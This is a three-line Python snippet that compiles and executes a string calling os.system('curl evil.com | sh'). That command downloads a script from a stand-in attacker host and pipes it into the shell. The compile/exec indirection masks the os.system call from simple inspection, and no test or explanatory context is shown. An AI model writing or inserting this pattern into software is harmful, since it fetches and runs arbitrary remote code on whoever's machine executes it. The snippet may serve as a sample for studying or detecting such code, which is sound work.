code = "os.system('curl evil.com | sh')"
c = compile(code, "<string>", "exec")
exec(c)